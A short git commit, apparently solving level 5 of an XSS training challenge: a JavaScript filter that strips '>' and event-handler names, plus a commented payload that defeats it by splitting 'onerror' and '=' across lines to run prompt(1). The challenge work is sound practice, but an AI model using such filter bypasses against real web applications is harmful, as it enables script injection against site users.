53703fd499e41a83a2851fd676b5689ef348218b
Alvin <alvinsmith.nz@gmail.com>
2019-01-03 21:57:03 +1300

    level 5

---
+++ 5.js
@@ -0,0 +1,12 @@
+function escape(input) {
+    // apply strict filter rules of level 0
+    // filter ">" and event handlers
+    input = input.replace(/>|on.+?=|focus/gi, '_');
+
+    return '<input value="' + input + '" type="text">';
+}        
+
+/*
+" type=image src onerror
+="prompt(1)
+*/
